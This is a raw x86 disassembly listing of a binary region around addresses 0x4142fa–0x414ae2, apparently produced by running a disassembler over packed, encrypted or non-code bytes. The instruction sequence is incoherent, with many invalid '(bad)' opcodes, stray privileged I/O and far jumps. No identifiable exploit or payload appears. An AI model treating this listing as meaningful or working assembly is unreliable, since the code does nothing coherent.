  4142fa:	fmul   QWORD PTR [edx-0x55d752b7]
  414300:	(bad)  
  414302:	inc    ebp
  414303:	push   es
  414304:	cmp    ch,BYTE PTR ds:0xbcb152c8
  41430a:	pop    ecx
  41430b:	ret    
  41430c:	and    ebp,DWORD PTR [edx+0x43]
  41430f:	pop    es
  414310:	push   edi
  414311:	pop    esi
  414312:	jg     0x414380
  414314:	iret   
  414315:	dec    ecx
  414316:	or     DWORD PTR [ebx+0x65014c42],esp
  41431c:	cdq    
  41431d:	push   ecx
  41431e:	inc    ebx
  41431f:	fisttp DWORD PTR [esi+ecx*2]
  414322:	add    eax,0xdacee620
  414327:	adc    ah,bh
  414329:	dec    edx
  41432a:	pop    es
  41432b:	hlt    
  41432c:	xchg   esp,eax
  41432d:	fidivr DWORD PTR ds:0x8137df4e
  414333:	aam    0x5
  414335:	mov    bl,0xdb
  414337:	scas   eax,DWORD PTR es:[edi]
  414338:	sbb    eax,0xb739da02
  41433d:	aas    
  41433e:	adc    eax,0x5298bc67
  414343:	rol    ebp,cl
  414345:	cdq    
  414346:	xor    BYTE PTR [ebx],ah
  414348:	out    dx,al
  414349:	mov    ch,0xd8
  41434b:	into   
  41434c:	lods   eax,DWORD PTR ds:[esi]
  41434d:	xchg   edx,eax
  41434e:	adc    BYTE PTR [di-0x11],0x94
  414353:	mov    cl,dl
  414355:	cmp    eax,0xb7ada3dd
  41435a:	mov    ebx,0xdb0cef9a
  41435f:	je     0x41430e
  414361:	js     0x4143da
  414363:	sahf   
  414364:	xor    al,0xd
  414366:	mov    al,ds:0x2ee0da20
  41436b:	pop    ss
  41436c:	test   DWORD PTR [ecx+eax*4],0x61d619de
  414373:	or     DWORD PTR [ebp+0x23de60ac],esi
  414379:	das    
  41437a:	int3   
  41437b:	inc    ebp
  41437c:	ja     0x4143e0
  41437e:	fnstenv [eax]
  414380:	(bad)  
  414382:	jo     0x414354
  414384:	scas   al,BYTE PTR es:[edi]
  414385:	jg     0x41434e
  414387:	xchg   ecx,eax
  414388:	mov    DWORD PTR [ecx-0x2395b186],edi
  41438e:	push   0xf08b9809
  414393:	xchg   BYTE PTR [ecx-0x51],al
  414396:	ds pop es
  414398:	pop    es
  414399:	fwait
  41439a:	test   BYTE PTR [esi+esi*1-0x46d018ad],al
  4143a1:	or     ch,al
  4143a3:	imul   DWORD PTR [ebx-0x30a67e37]
  4143a9:	dec    edx
  4143aa:	cmp    eax,0xb4dcc58a
  4143af:	sbb    ebx,DWORD PTR [eax+0x4fb4b0d4]
  4143b5:	test   al,0x6
  4143b7:	test   ah,ah
  4143b9:	test   al,0x55
  4143bb:	in     al,0x37
  4143bd:	cld    
  4143be:	fs repz retf 
  4143c1:	push   ds
  4143c2:	shr    DWORD PTR [edx+0x655c80b1],cl
  4143c8:	int3   
  4143c9:	repnz cmovbe edx,DWORD PTR [edi+0x6e717222]
  4143d1:	lods   eax,DWORD PTR ds:[esi]
  4143d2:	ins    DWORD PTR es:[edi],dx
  4143d3:	clc    
  4143d4:	jecxz  0x4143ab
  4143d6:	fdivr  DWORD PTR [eax-0x34]
  4143d9:	outs   dx,BYTE PTR ds:[esi]
  4143da:	imul   edx,DWORD PTR [esi],0xffffffd9
  4143dd:	pop    es
  4143de:	lods   eax,DWORD PTR ds:[esi]
  4143df:	retf   
  4143e0:	call   0x35f0:0x48c66ef9
  4143e7:	jmp    0x4143fa
  4143e9:	loop   0x41436d
  4143eb:	int    0x31
  4143ed:	jl     0x414425
  4143ef:	add    BYTE PTR [ecx],0xf6
  4143f2:	mov    ch,BYTE PTR [esp+edx*2-0x6]
  4143f6:	pop    esi
  4143f7:	pop    ebp
  4143f8:	int    0x5d
  4143fa:	adc    ah,BYTE PTR [edx+ebx*1-0x2b]
  4143fe:	inc    edx
  4143ff:	mov    dh,0x7a
  414401:	pop    es
  414402:	pusha  
  414403:	lods   al,BYTE PTR ds:[esi]
  414404:	mov    al,0x9e
  414406:	xchg   esp,eax
  414407:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414408:	mov    eax,ds:0x19241327
  41440d:	xchg   esi,eax
  41440e:	fst    DWORD PTR [edx+0x7b]
  414411:	gs sbb eax,0x7e54a38b
  414417:	mov    eax,ds:0xa8f3f56d
  41441c:	test   BYTE PTR [ebx],bh
  41441e:	xchg   ah,dl
  414420:	adc    esp,DWORD PTR [edi-0x6f437de6]
  414426:	int3   
  414427:	(bad)  
  414429:	adc    ebp,esi
  41442b:	test   al,0x32
  41442d:	aam    0x0
  41442f:	leave  
  414430:	call   FWORD PTR [ebx-0x1f]
  414433:	cmp    BYTE PTR [ecx],0x5f
  414436:	inc    eax
  414437:	mov    ds:0xc277601e,al
  41443c:	(bad)  [eax-0x13]
  41443f:	std    
  414440:	and    al,0x4c
  414442:	scas   al,BYTE PTR es:[edi]
  414443:	retf   
  414444:	(bad)  
  414445:	mov    ebp,0x1d9ec395
  41444a:	sbb    DWORD PTR gs:[eax+0x6d],0xffffff99
  41444f:	fdivr  QWORD PTR [edi+0x60]
  414452:	rcr    ebx,cl
  414454:	mov    bh,0x6b
  414456:	(bad)  
  414457:	jl     0x414408
  414459:	int3   
  41445a:	movsx  edx,ch
  41445d:	aam    0xf2
  41445f:	xor    eax,0xb0ae3aca
  414464:	or     eax,0xd58523c1
  414469:	scas   eax,DWORD PTR es:[edi]
  41446a:	(bad)  
  41446b:	loop   0x41447a
  41446d:	pop    ebp
  41446e:	mov    al,0x31
  414470:	mov    dl,0x43
  414472:	hlt    
  414473:	rol    BYTE PTR [ecx-0x4dad0cb1],0xf1
  41447a:	jp     0x414400
  41447c:	xor    DWORD PTR ds:0xec53d9a7,ecx
  414482:	mov    ds:0x758aa1e,al
  414487:	cld    
  414488:	outs   dx,BYTE PTR ds:[esi]
  414489:	jnp    0x4144f7
  41448b:	push   es
  41448c:	adc    al,0x81
  41448e:	dec    DWORD PTR [edi]
  414490:	add    BYTE PTR [ecx+0x6ce3ae85],al
  414496:	test   al,0x6a
  414498:	and    al,ah
  41449a:	mov    cl,0x4a
  41449c:	call   0x75152ff1
  4144a1:	sti    
  4144a2:	mov    ebx,0x9ff6b846
  4144a7:	xor    esp,DWORD PTR [esi]
  4144a9:	mov    edi,fs
  4144ab:	jle    0x41447e
  4144ad:	sub    dh,BYTE PTR [edi+0x3b]
  4144b0:	sbb    al,0x98
  4144b2:	or     eax,0x7c908057
  4144b7:	hlt    
  4144b8:	jl     0x414486
  4144ba:	sbb    dh,BYTE PTR [ebp+0x18948fd4]
  4144c0:	les    esp,FWORD PTR [esi-0x80]
  4144c3:	push   es
  4144c4:	sbb    ebx,DWORD PTR [ebx-0x73]
  4144c7:	push   es
  4144c8:	sbb    edi,edx
  4144ca:	out    dx,eax
  4144cb:	ret    0x4194
  4144ce:	add    bl,BYTE PTR [eax-0x513ed53d]
  4144d4:	jp     0x414552
  4144d6:	dec    ebp
  4144d7:	in     al,dx
  4144d8:	mov    cl,0xb9
  4144da:	icebp  
  4144db:	and    al,0x39
  4144dd:	jmp    0xed5f1bfa
  4144e2:	push   ss
  4144e3:	pop    ecx
  4144e4:	ret    
  4144e5:	mov    eax,ds:0x15e5b0b7
  4144ea:	cdq    
  4144eb:	test   DWORD PTR [ebx],ecx
  4144ed:	(bad)  
  4144ee:	aas    
  4144ef:	sbb    ch,bh
  4144f1:	aaa    
  4144f2:	mov    esp,0x96dba687
  4144f7:	mov    al,ds:0x773f09ce
  4144fc:	loop   0x4144e5
  4144fe:	or     ecx,DWORD PTR [eax+0x42]
  414501:	adc    ah,dh
  414503:	pop    ss
  414504:	in     al,dx
  414505:	mov    ds:0xd84ebc05,eax
  41450a:	arpl   bx,si
  41450c:	fs retf 0x2317
  414510:	push   edx
  414511:	cmp    eax,0x259b0407
  414516:	jp     0x414545
  414518:	out    dx,al
  414519:	mov    esi,0xba915678
  41451e:	mov    bh,BYTE PTR [eax]
  414520:	shr    BYTE PTR [ebx-0x17],1
  414523:	xchg   edi,eax
  414524:	push   esp
  414525:	mov    ah,0x8
  414527:	mov    al,0x80
  414529:	dec    ebp
  41452a:	jmp    0x4144c4
  41452c:	fild   QWORD PTR [ebx]
  41452e:	xchg   esi,eax
  41452f:	sbb    eax,0xe06392c3
  414534:	loopne 0x4144ba
  414536:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414537:	or     DWORD PTR [eax],esp
  414539:	push   ecx
  41453a:	mov    dl,0x74
  41453c:	imul   eax,DWORD PTR [edi+0x65725c2d],0x63
  414543:	retf   
  414544:	mov    esi,0x3ac4cad1
  414549:	mov    ah,0x77
  41454b:	mov    esp,0x1c88e8d0
  414550:	pusha  
  414551:	les    ebp,FWORD PTR [ecx]
  414553:	sub    bh,BYTE PTR [esp+0x30]
  414557:	dec    edi
  414558:	loope  0x41454a
  41455a:	sub    ah,BYTE PTR [eax-0x44d39cb7]
  414560:	dec    edi
  414561:	xchg   ebx,eax
  414562:	push   ebp
  414563:	cmp    BYTE PTR [ecx-0x32a72b9a],ch
  414569:	(bad)  
  41456a:	shr    DWORD PTR [ecx-0x53],1
  41456d:	cmp    bl,BYTE PTR [ecx-0x79]
  414570:	fld    DWORD PTR [esi+0x53299e0e]
  414576:	shl    ah,1
  414578:	push   0x6d
  41457a:	lea    esi,[edi-0x29d69e7a]
  414580:	push   edx
  414581:	loop   0x41450f
  414583:	sahf   
  414584:	aas    
  414585:	test   DWORD PTR fs:[esp+edi*8-0x57f62550],ebp
  41458d:	cmp    eax,ebx
  41458f:	add    cl,dl
  414591:	stc    
  414592:	int    0xb3
  414594:	test   eax,0x6b875fbb
  41459a:	sub    bl,dl
  41459c:	and    al,0x7f
  41459e:	nop    edi
  4145a1:	mov    esp,0x40d33b22
  4145a6:	test   DWORD PTR [esi+0x493545f5],edi
  4145ac:	inc    eax
  4145ad:	mov    ds:0xdbf748a8,eax
  4145b2:	mov    DWORD PTR [ebp+ebx*4+0xa02d55e],ebx
  4145b9:	ss and al,0x58
  4145bc:	xor    al,BYTE PTR [ebx+0x522f89b7]
  4145c2:	xchg   ecx,eax
  4145c3:	arpl   WORD PTR [ebx],ax
  4145c5:	mov    esp,0xa3ef7105
  4145ca:	jbe    0x4145fd
  4145cc:	add    DWORD PTR [ebp+0x16],esi
  4145cf:	and    ebx,DWORD PTR [edi-0x4eb6cc88]
  4145d5:	shl    BYTE PTR ss:[ebp+0x76c60003],cl
  4145dc:	pop    ss
  4145dd:	bound  esp,QWORD PTR [edx]
  4145df:	bound  esp,QWORD PTR [edi-0x2e]
  4145e2:	push   es
  4145e3:	pusha  
  4145e4:	nop
  4145e5:	jb     0x41463b
  4145e7:	or     BYTE PTR [eax+eiz*2-0x8],0x9f
  4145ec:	out    dx,eax
  4145ed:	std    
  4145ee:	mov    dh,0xc2
  4145f0:	cwde   
  4145f1:	adc    BYTE PTR ds:0xb46a5ae6,cl
  4145f7:	in     eax,dx
  4145f8:	sahf   
  4145f9:	rol    DWORD PTR [edx-0x31],1
  4145fc:	lods   eax,DWORD PTR ds:[esi]
  4145fd:	loop   0x414621
  4145ff:	out    dx,eax
  414600:	push   edx
  414601:	mov    cl,0xfd
  414603:	adc    cl,0xff
  414606:	xor    BYTE PTR [eax-0x74c1b184],0x28
  41460d:	das    
  41460e:	mov    al,ds:0x46d01e84
  414613:	jp     0x414674
  414615:	push   ecx
  414616:	mov    bl,0x2b
  414619:	sbb    dh,BYTE PTR [esi-0x2c]
  41461c:	mov    DWORD PTR [esi-0x4],ecx
  41461f:	dec    esp
  414620:	push   esp
  414621:	xor    eax,0x4eb53580
  414626:	fist   DWORD PTR [ebx+0x55]
  414629:	cmp    ebp,ebx
  41462b:	sbb    al,0x27
  41462d:	aam    0xb9
  41462f:	dec    ebx
  414630:	fstp   TBYTE PTR [edx+0x5c]
  414633:	pop    ss
  414634:	lock inc eax
  414636:	jle    0x4145d5
  414638:	data16 (bad) 
  41463b:	addr16 xor esi,eax
  41463e:	lds    esp,FWORD PTR [esi-0x1ef4e00]
  414644:	sar    cl,cl
  414646:	clc    
  414647:	fmul   DWORD PTR [ebx-0x9e1751a]
  41464d:	pop    eax
  41464e:	cmp    esi,DWORD PTR [edi+0x24eea383]
  414654:	pop    ss
  414655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414656:	push   edi
  414657:	(bad)  
  414658:	mov    edx,0x39fb61e
  41465d:	cdq    
  41465e:	das    
  41465f:	scas   al,BYTE PTR es:[edi]
  414660:	adc    al,0x6c
  414662:	ret    
  414663:	jp     0x41466d
  414665:	inc    ecx
  414666:	lods   eax,DWORD PTR ds:[esi]
  414667:	push   ds
  414668:	xor    al,0xa5
  41466a:	bound  edi,QWORD PTR [ebx]
  41466c:	inc    esp
  41466d:	mov    bh,0xde
  41466f:	mov    ds:0x615c742f,eax
  414674:	call   0xb6cd4cbb
  414679:	in     eax,dx
  41467a:	xchg   edx,eax
  41467b:	arpl   WORD PTR [edx],ax
  41467d:	xor    DWORD PTR [ecx+0x152b724],ebx
  414683:	and    bh,BYTE PTR [esi]
  414685:	loope  0x414682
  414687:	push   ss
  414688:	out    0xf6,al
  41468a:	pushf  
  41468b:	es mov edi,0x52e4abcd
  414691:	inc    esi
  414692:	pop    edi
  414693:	sbb    DWORD PTR [ebx],ebp
  414695:	and    al,0x5e
  414697:	es push ecx
  414699:	loope  0x4146b9
  41469b:	mov    bh,BYTE PTR ds:0x15558ac1
  4146a1:	ficomp DWORD PTR [ebp-0x14]
  4146a4:	test   eax,0x9f70afea
  4146a9:	adc    DWORD PTR [edi+0x7715f203],0xee4ed637
  4146b3:	out    0xc6,al
  4146b5:	cmp    DWORD PTR [edx],0xffffffd6
  4146b8:	xchg   esp,eax
  4146b9:	loop   0x414676
  4146bb:	sub    DWORD PTR [edi],edx
  4146bd:	jmp    0x4146ac
  4146bf:	outs   dx,BYTE PTR ds:[esi]
  4146c0:	inc    ebp
  4146c1:	jp     0x41468a
  4146c3:	cli    
  4146c4:	jge    0x41472c
  4146c6:	add    esi,DWORD PTR [edi-0x30f65858]
  4146cc:	(bad)  
  4146ce:	bound  eax,QWORD PTR [ecx-0xa]
  4146d1:	mov    edi,0x6a283a1b
  4146d6:	retf   
  4146d7:	lahf   
  4146d8:	push   edi
  4146d9:	add    ch,BYTE PTR [eax+ecx*4-0x55]
  4146dd:	mov    ebp,0xcde9f320
  4146e2:	xor    ebp,DWORD PTR [ebx]
  4146e4:	jl     0x414726
  4146e6:	lahf   
  4146e7:	lahf   
  4146e8:	sti    
  4146e9:	mov    dh,0xcb
  4146eb:	dec    edi
  4146ec:	cmp    ebp,DWORD PTR ds:0xc1a4611f
  4146f2:	sub    DWORD PTR [edx],esp
  4146f4:	outs   dx,BYTE PTR ds:[esi]
  4146f5:	call   0x6971cdb3
  4146fa:	add    edx,esi
  4146fc:	push   ebp
  4146fd:	mov    bh,0xe8
  4146ff:	mov    cl,0x45
  414701:	div    BYTE PTR [esi]
  414703:	jno    0x414778
  414705:	popa   
  414706:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414707:	xchg   DWORD PTR [esp+eax*8-0x452c7be8],esi
  41470e:	test   BYTE PTR [esi+0x12],cl
  414711:	imul   esi,DWORD PTR [ecx+0xd3ec3f6],0x358a45bb
  41471b:	jb     0x4146f9
  41471d:	test   BYTE PTR [eax+0x7a5d93e3],dl
  414723:	sub    BYTE PTR [ebx+edx*4-0x309e851],bl
  41472a:	sbb    eax,0x77e397ca
  41472f:	jp     0x4146ec
  414731:	mov    ch,BYTE PTR [edi-0x24]
  414734:	std    
  414735:	jmp    0x68aa:0xf28971d9
  41473c:	jb     0x41471b
  41473e:	xchg   ebx,eax
  41473f:	nop
  414740:	add    ebx,edx
  414742:	jp     0x4146db
  414744:	shr    BYTE PTR [esi-0x6b82284e],0xc8
  41474b:	ficom  WORD PTR [edi]
  41474d:	mov    ecx,DWORD PTR [ebx+ebp*4-0x3]
  414751:	push   ds
  414752:	and    eax,esi
  414754:	fucom  st(5)
  414756:	pop    ebp
  414757:	add    eax,0x88f211d6
  41475c:	sub    eax,0x710f8bb1
  414761:	jg     0x41478c
  414763:	adc    al,0xc1
  414765:	cmp    al,0xc5
  414767:	jmp    0x293cc0ce
  41476c:	test   dl,0xb5
  41476f:	mov    bh,0x2b
  414771:	lahf   
  414772:	xchg   esp,eax
  414773:	adc    bl,BYTE PTR [edi-0x22]
  414776:	ret    
  414777:	pop    ecx
  414778:	or     ah,ah
  41477a:	in     al,0x60
  41477c:	push   edx
  41477d:	xchg   edx,eax
  41477e:	pop    edx
  41477f:	sti    
  414780:	pushf  
  414781:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414782:	sbb    dl,cl
  414784:	repnz dec eax
  414786:	out    0xd9,eax
  414788:	jecxz  0x4147e7
  41478a:	cmp    edi,DWORD PTR [ecx-0x30]
  41478d:	je     0x4147c6
  41478f:	imul   ebp,edi,0xb9b32e8
  414795:	xor    eax,0xf32e2642
  41479a:	xor    eax,0x10ee47e3
  41479f:	in     eax,0x7d
  4147a1:	pusha  
  4147a2:	addr16 inc ebx
  4147a4:	stos   BYTE PTR es:[edi],al
  4147a5:	ins    DWORD PTR es:[edi],dx
  4147a6:	cwde   
  4147a7:	jg     0x414738
  4147a9:	jnp    0x41478c
  4147ab:	shl    cl,cl
  4147ad:	test   BYTE PTR [ebp-0x80],0x42
  4147b1:	dec    ebx
  4147b2:	cmp    BYTE PTR [ebx-0x52427cf2],bl
  4147b8:	push   eax
  4147b9:	push   esi
  4147ba:	sbb    DWORD PTR [ecx+0x7d],ebp
  4147bd:	aad    0x95
  4147bf:	mov    dh,0x6f
  4147c1:	mov    ebp,0x8fb2b43f
  4147c6:	sub    dl,dl
  4147c8:	into   
  4147c9:	cmp    eax,0xb71e090
  4147ce:	mov    bl,0xde
  4147d0:	out    dx,eax
  4147d1:	fmul   st,st(3)
  4147d3:	test   DWORD PTR [edi],edx
  4147d5:	scas   eax,DWORD PTR es:[edi]
  4147d6:	aas    
  4147d7:	mov    ch,0x2
  4147d9:	shl    DWORD PTR [edi-0x2a],1
  4147dc:	stos   DWORD PTR es:[edi],eax
  4147dd:	aaa    
  4147de:	and    dh,BYTE PTR [ecx+ecx*2-0x4190381d]
  4147e5:	pushf  
  4147e6:	out    0x73,al
  4147e8:	cmp    eax,0x13c80194
  4147ed:	fisttp DWORD PTR [ebp-0x718446a9]
  4147f3:	dec    eax
  4147f4:	mov    WORD PTR [ebx],fs
  4147f6:	jg     0x414833
  4147f8:	rol    DWORD PTR [edx+0x70],1
  4147fb:	ret    0x6a4f
  4147fe:	adc    BYTE PTR [ebx],0xbc
  414801:	push   esi
  414802:	jge    0x414874
  414804:	pop    esp
  414805:	dec    edi
  414806:	dec    eax
  414807:	sub    al,0xfb
  414809:	inc    esp
  41480a:	mov    bl,0x16
  41480c:	test   eax,0x505444e
  414811:	(bad)
  414814:	test   al,0x3c
  414816:	mov    edi,0xd2c26806
  41481b:	outs   dx,BYTE PTR ds:[esi]
  41481c:	imul   BYTE PTR [ebp+eax*2+0x41]
  414820:	push   cs
  414821:	loopne 0x4147ee
  414823:	push   ecx
  414824:	addr16 and al,ch
  414827:	xchg   edi,eax
  414828:	mov    esi,0xb0db5f76
  41482d:	mov    ds:0x8194c6a1,al
  414832:	pusha  
  414833:	into   
  414834:	push   edi
  414835:	out    dx,al
  414836:	xchg   ecx,eax
  414837:	shl    esp,0x5f
  41483a:	jae    0x41485b
  41483c:	sub    BYTE PTR [ebx+0x5ca64162],ch
  414842:	sub    dl,BYTE PTR [ebp+0x2f9b5eb4]
  414848:	add    ebx,DWORD PTR [esi+0x3c48a887]
  41484e:	out    dx,al
  41484f:	or     bl,BYTE PTR [ebx+0x53847582]
  414855:	jle    0x414843
  414857:	stc    
  414858:	ds sti 
  41485a:	jle    0x414809
  41485c:	sub    ecx,DWORD PTR [edx-0x24]
  41485f:	mov    dh,al
  414861:	sub    al,0x92
  414863:	mov    cl,0xf2
  414865:	test   eax,0x956b039d
  41486a:	dec    edi
  41486b:	out    0x12,al
  41486d:	test   DWORD PTR [esi],edi
  41486f:	out    dx,eax
  414870:	push   esi
  414871:	(bad)  
  414872:	sbb    ch,BYTE PTR [eax]
  414874:	loopne 0x414889
  414876:	or     DWORD PTR [eax+0x14],esp
  414879:	xchg   ebp,eax
  41487a:	push   0xffffffac
  41487c:	(bad)  
  41487d:	push   ecx
  41487e:	pop    es
  41487f:	add    DWORD PTR [edx],esp
  414881:	inc    esi
  414883:	in     al,0xf7
  414885:	mov    bh,0x63
  414887:	mov    bl,0xb2
  414889:	mov    eax,ds:0x677d0bf2
  41488e:	imul   DWORD PTR [ebx]
  414890:	mov    dl,0x4d
  414892:	ds das 
  414894:	sub    BYTE PTR [ecx-0x4c],cl
  414897:	ja     0x4148b2
  414899:	jmp    0x5035:0x89c55fd7
  4148a0:	test   ah,dl
  4148a2:	or     bh,BYTE PTR [ebp+0x761b7c11]
  4148a8:	lock sub DWORD PTR [edi],edx
  4148ab:	mov    ecx,0x6b6f6ae9
  4148b0:	sub    DWORD PTR [ecx],eax
  4148b2:	scas   al,BYTE PTR es:[edi]
  4148b3:	mov    edi,0x9246c933
  4148b8:	cmc    
  4148b9:	shl    BYTE PTR [ebx-0x1b45d4ac],cl
  4148bf:	(bad)  
  4148c0:	stos   DWORD PTR es:[edi],eax
  4148c1:	and    bh,BYTE PTR [edx]
  4148c3:	jbe    0x414930
  4148c5:	stc    
  4148c6:	or     eax,0x666d1a0d
  4148cb:	ja     0x414922
  4148cd:	mov    ds:0x6649aef8,eax
  4148d2:	and    BYTE PTR [ebx+ecx*2-0x38ae2f10],dl
  4148d9:	mov    bh,BYTE PTR [ebx+0x7c]
  4148dc:	outs   dx,BYTE PTR ds:[esi]
  4148dd:	(bad)  
  4148de:	or     al,0x37
  4148e0:	mov    ecx,0x97f0a471
  4148e5:	mov    ?,edx
  4148e7:	sahf   
  4148e8:	push   ss
  4148e9:	add    dh,BYTE PTR [edi+0x7a]
  4148ec:	mov    cs,edi
  4148ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148ef:	je     0x4148f5
  4148f1:	and    al,0x5e
  4148f3:	stos   BYTE PTR es:[edi],al
  4148f4:	push   eax
  4148f5:	add    DWORD PTR [edi-0x58d9bd84],ebp
  4148fb:	pop    ecx
  4148fc:	js     0x414911
  4148fe:	ins    DWORD PTR es:[edi],dx
  4148ff:	adc    eax,edx
  414901:	add    al,0x22
  414903:	xor    al,0x17
  414906:	ds mov ebx,0x8ee37112
  41490c:	dec    eax
  41490d:	clc    
  41490e:	jle    0x414932
  414910:	cwde   
  414911:	mov    ds:0xe687af19,al
  414916:	in     eax,dx
  414917:	sbb    eax,0xec6635e5
  41491c:	arpl   WORD PTR [edi+0x4ec856b],bp
  414922:	fs mov ebp,0x36e61e59
  414928:	cmp    al,0xfd
  41492a:	add    BYTE PTR [edx-0x1aecbba8],ah
  414930:	or     ecx,DWORD PTR gs:[bx+di-0x38]
  414935:	stos   BYTE PTR es:[edi],al
  414936:	add    al,0x3e
  414938:	ficomp DWORD PTR [eax]
  41493a:	fs fs sub al,0xf1
  41493e:	inc    esp
  41493f:	adc    edx,DWORD PTR [esi-0x27]
  414942:	cld    
  414943:	(bad)  
  414944:	fld    DWORD PTR [edx-0x72]
  414947:	lods   eax,DWORD PTR ds:[esi]
  414948:	mov    edi,0x8d076d2
  41494d:	int    0x2d
  41494f:	hlt    
  414950:	int    0xd5
  414952:	adc    al,0xd4
  414954:	xchg   ecx,eax
  414955:	cmp    esp,DWORD PTR [eax]
  414957:	shl    ebx,0xef
  41495a:	frstor [ecx-0x28a59f9c]
  414960:	xchg   edi,eax
  414961:	or     eax,0x1101ea02
  414966:	je     0x414989
  414968:	repz pusha 
  41496a:	out    dx,eax
  41496b:	in     eax,0x7e
  41496d:	(bad)  
  41496e:	xchg   esp,eax
  41496f:	xor    DWORD PTR [ebx],ebx
  414971:	sbb    al,0xe5
  414973:	dec    ebp
  414974:	sub    al,0x5e
  414976:	out    0x79,eax
  414978:	fwait
  414979:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41497a:	ds xchg esi,eax
  41497c:	sbb    DWORD PTR [edi*4+0x320a85e0],0xffffff80
  414984:	cmp    dl,BYTE PTR [ebx-0x7]
  414987:	(bad)  
  414988:	out    0xdb,al
  41498a:	clc    
  41498b:	add    bh,bh
  41498d:	adc    al,0x7a
  41498f:	dec    edx
  414990:	mov    esi,cs
  414992:	add    BYTE PTR [eax+eiz*1+0x71f10bc0],ah
  414999:	jmp    0x414936
  41499b:	xchg   BYTE PTR [ecx-0x31],al
  41499e:	inc    ecx
  41499f:	shr    BYTE PTR [ecx],1
  4149a1:	ins    DWORD PTR es:[edi],dx
  4149a2:	adc    eax,0x7a925009
  4149a7:	adc    ebx,0x553946b5
  4149ad:	fwait
  4149ae:	push   edi
  4149af:	push   0xffffffd5
  4149b1:	pop    ebp
  4149b2:	cdq    
  4149b3:	aam    0x71
  4149b5:	fwait
  4149b6:	push   ss
  4149b7:	je     0x4149e4
  4149b9:	mov    ebx,0x40539c2d
  4149be:	int    0x13
  4149c0:	push   ebp
  4149c1:	xchg   ebp,eax
  4149c2:	jns    0x4149aa
  4149c4:	push   cs
  4149c5:	pop    esp
  4149c6:	fldcw  WORD PTR [edx-0x54]
  4149c9:	cmp    eax,edx
  4149cb:	(bad)  
  4149cc:	push   esi
  4149cd:	jl     0x414973
  4149cf:	inc    ecx
  4149d0:	mov    ebp,0x720f6a7f
  4149d5:	pop    ecx
  4149d6:	inc    ecx
  4149d7:	clc    
  4149d8:	iret   
  4149d9:	ret    0x3f11
  4149dc:	xchg   edi,eax
  4149dd:	dec    ebp
  4149de:	sbb    BYTE PTR [ecx],al
  4149e0:	sti    
  4149e1:	mov    DWORD PTR [ebx-0x4e],eax
  4149e4:	jecxz  0x414989
  4149e6:	jno    0x414a4f
  4149e8:	gs inc edi
  4149ea:	push   edi
  4149eb:	mov    DWORD PTR [ebx-0x565f5876],0x1399ec42
  4149f5:	in     eax,dx
  4149f6:	in     al,dx
  4149f7:	shl    edi,1
  4149f9:	loop   0x414a01
  4149fb:	xchg   DWORD PTR [ecx+0x61d0980b],edi
  414a01:	sub    al,0x34
  414a03:	mov    ds:0x6e227583,eax
  414a08:	sahf   
  414a09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a0a:	js     0x414a55
  414a0c:	cmc    
  414a0d:	lahf   
  414a0e:	sbb    al,0x77
  414a10:	pusha  
  414a11:	stos   DWORD PTR es:[edi],eax
  414a12:	xchg   esi,eax
  414a13:	xor    cl,al
  414a15:	in     eax,dx
  414a16:	iret   
  414a17:	int3   
  414a18:	leave  
  414a19:	inc    ebx
  414a1a:	and    bl,BYTE PTR [edx+0x3e]
  414a1d:	sub    dl,ah
  414a1f:	fdiv   st(6),st
  414a21:	gs out 0x25,eax
  414a24:	enter  0xc18e,0xac
  414a28:	imul   eax,DWORD PTR [edi+0x78387a6c],0x844a0158
  414a32:	cld    
  414a33:	and    al,0x66
  414a35:	mov    DWORD PTR [ebp+0x7776d547],esp
  414a3b:	fnsave ds:0xffbcec5a
  414a41:	xor    ah,ah
  414a43:	jb     0x414ab7
  414a45:	adc    edi,DWORD PTR [edx+edx*4+0x0]
  414a49:	mov    ds:0xd58fda90,al
  414a4e:	je     0x414a78
  414a50:	add    DWORD PTR [edi],0xb3725006
  414a56:	mov    eax,ds:0xbed10245
  414a5b:	xor    eax,0x729302ac
  414a60:	jmp    0x414abe
  414a62:	cmc    
  414a63:	jnp    0x414abe
  414a65:	inc    ebp
  414a66:	inc    edx
  414a67:	(bad)  [eax+0x49]
  414a6a:	cli    
  414a6b:	dec    eax
  414a6c:	hlt    
  414a6d:	dec    ecx
  414a6e:	pop    edi
  414a6f:	mov    cl,0xc5
  414a71:	div    dh
  414a73:	imul   edx,DWORD PTR [edx+0x13],0x43f5b014
  414a7a:	add    al,0x8b
  414a7c:	sub    ch,ch
  414a7e:	in     eax,dx
  414a7f:	push   0x3e375802
  414a84:	jle    0x414a1b
  414a86:	in     al,dx
  414a87:	inc    esi
  414a88:	ret    0xcde3
  414a8b:	mov    ch,0x70
  414a8d:	in     eax,0xe1
  414a8f:	and    DWORD PTR [edx+0x1a1a09cf],ecx
  414a95:	ret    
  414a96:	(bad)  
  414a97:	out    0xfc,eax
  414a99:	or     eax,0xbf91e98f
  414a9e:	stc    
  414a9f:	imul   ebx
  414aa1:	repz xor DWORD PTR ds:0xdb4544cf,0x2e
  414aa9:	addr16 xor al,0x2b
  414aac:	pop    es
  414aad:	popa   
  414aae:	out    0x6c,al
  414ab0:	std    
  414ab1:	shr    BYTE PTR [ebp+edx*8-0x53],1
  414ab5:	in     eax,0x6d
  414ab7:	and    eax,0x714e46d
  414abc:	fadd   DWORD PTR [edx+0x48]
  414abf:	ins    BYTE PTR es:[edi],dx
  414ac0:	jae    0x414afa
  414ac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ac3:	push   ds
  414ac4:	mov    esp,0xbdffbb8e
  414ac9:	dec    ecx
  414aca:	add    DWORD PTR [ebx],0x4e
  414acd:	fild   QWORD PTR [edi]
  414acf:	mov    al,0xba
  414ad1:	xchg   ecx,eax
  414ad2:	stos   BYTE PTR es:[edi],al
  414ad3:	sbb    BYTE PTR [ecx],bh
  414ad5:	xchg   ebp,eax
  414ad6:	mov    esi,0x544a55d4
  414adb:	das    
  414adc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414add:	jge    0x414a63
  414adf:	mov    ss,WORD PTR [eax-0x37]
  414ae2:	jns    0x414b5d
